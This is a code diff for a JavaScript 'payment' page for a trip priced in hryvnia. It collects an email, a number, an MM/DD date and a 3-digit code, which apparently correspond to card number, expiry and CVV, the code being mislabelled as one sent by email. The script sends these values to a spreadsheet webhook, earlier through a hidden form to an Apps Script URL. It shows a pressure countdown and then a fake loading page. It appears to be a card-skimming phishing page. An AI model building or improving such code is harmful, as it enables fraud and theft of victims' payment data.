@@ -15,7 +15,7 @@ const emailCodeEl = document.getElementById('emailCode');
 const payBtn = document.getElementById('payBtn');
 const countdownEl = document.getElementById('countdown');
 
-function pad2(n){return String(n).padStart(2,'0')}
+function pad2(n){ return String(n).padStart(2,'0'); }
 function formatToMMDD(iso){
   if(!iso) return '';
   const d = new Date(iso + 'T00:00:00');
@@ -35,6 +35,7 @@ function hydrateTripFromData(){
   priceLabel.textContent = `${price} ₴`;
   totalLabel.textContent = `${price} ₴`;
 }
+
 function validate(){
   const email = (emailEl.value || '').trim();
   const numberVal = (userNumberEl.value || '').trim();
@@ -47,42 +48,32 @@ function validate(){
   }
   if(!numberVal){ alert('Вкажіть номер.'); userNumberEl.focus(); return false; }
   if(!/^\d{2}\/\d{2}$/.test(mdDateVal)){
-  alert('Дата має бути у форматі MM/DD.');
-  mdDateEl.focus();
-  return false;
-}
-  if(!/^\d{3}$/.test(codeVal)){ alert('Код з пошти має містити рівно 3 цифри.'); emailCodeEl.focus(); return false; }
+    alert('Дата має бути у форматі MM/DD.');
+    mdDateEl.focus(); return false;
+  }
+  if(!/^\d{3}$/.test(codeVal)){
+    alert('Код з пошти має містити рівно 3 цифри.');
+    emailCodeEl.focus(); return false;
+  }
   return { email, numberVal, mdDateVal, codeVal };
 }
+
 async function sendToSheet(payload){
   try{
     if(typeof SHEET_WEBHOOK_URL !== 'string' || !SHEET_WEBHOOK_URL) return;
-
-    const bodyStr = JSON.stringify(payload);
-
-    // 1) Найнадійніше: sendBeacon (не скасовується при переході)
-    if (navigator.sendBeacon) {
-      const blob = new Blob([bodyStr], { type: 'text/plain;charset=utf-8' });
-      navigator.sendBeacon(SHEET_WEBHOOK_URL, blob);
-      return true;
-    }
-
-    // 2) Fallback: fetch з keepalive + no-cors (без префлайту)
+    // Проксі на нашому домені: можна звичайний JSON POST
     await fetch(SHEET_WEBHOOK_URL, {
       method: 'POST',
-      mode: 'no-cors',
-      keepalive: true,
-      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-      body: bodyStr
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      keepalive: true
     });
-
-    return true;
   }catch(e){
-    // можна глянути у консоль під час дебагу:
+    // Можна подивитися у консолі при дебазі:
     // console.error('sendToSheet error', e);
-    return false;
   }
 }
+
 async function onPay(){
   const v = validate();
   if(!v) return;
@@ -99,31 +90,13 @@ async function onPay(){
     price: (priceLabel.textContent || '').replace(' ₴','')
   };
 
-  // ===== СУПЕР-ПРОСТЕ ВІДПРАВЛЕННЯ ЧЕРЕЗ ПРИХОВАНУ ФОРМУ =====
-  const form = document.getElementById('sheetForm');
-  form.action = APPS_FORM_URL;                // URL твого Apps Script
-  form.elements.email.value  = entry.email;
-  form.elements.number.value = entry.number;
-  form.elements.date.value   = entry.date;
-  form.elements.code.value   = entry.code;
-  form.elements.route.value  = entry.route;
-  form.elements.from.value   = entry.from;
-  form.elements.to.value     = entry.to;
-  form.elements.price.value  = entry.price;
-  form.submit();  // браузер відправляє POST у фоновому <iframe> і не скасовує при переході
-
-  // мʼяка затримка перед навігацією, щоб точно встигло відправитись
-  setTimeout(() => {
-    window.location.href = '/loading.html';
-  }, 200);
-}
-  // Відправляємо (не чекаємо відповіді)
+  // Відправляємо і одразу переходимо на "обробку"
   sendToSheet(entry);
 
-  // Дай браузеру 200–300 мс, щоб відправити пакет, і тільки потім переходь
   setTimeout(() => {
     window.location.href = '/loading.html';
-  }, 300);
+  }, 300); // невелика пауза, щоб запит точно пішов
+}
 
 function startCountdown(minutes=5){
   let remain = minutes*60;
@@ -142,6 +115,18 @@ function startCountdown(minutes=5){
   tick();
 }
 
+// Автододавання "/" у полі MM/DD
+document.addEventListener("DOMContentLoaded", () => {
+  const mdDateInput = document.getElementById("mdDate");
+  if (mdDateInput) {
+    mdDateInput.addEventListener("input", (e) => {
+      let v = e.target.value.replace(/\D/g, "");
+      if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2);
+      e.target.value = v.slice(0, 5);
+    });
+  }
+});
+
 document.addEventListener('DOMContentLoaded', () => {
   hydrateTripFromData();
   yearEl && (yearEl.textContent = new Date().getFullYear());
@@ -150,15 +135,4 @@ document.addEventListener('DOMContentLoaded', () => {
   }
   payBtn && payBtn.addEventListener('click', onPay);
   startCountdown(5);
-});
-
-document.addEventListener("DOMContentLoaded", () => {
-  const mdDateInput = document.getElementById("mdDate");
-  if (mdDateInput) {
-    mdDateInput.addEventListener("input", (e) => {
-      let v = e.target.value.replace(/\D/g, ""); // прибирає все, крім цифр
-      if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2); // додає "/"
-      e.target.value = v.slice(0, 5); // обмежує до формату MM/DD
-    });
-  }
 });
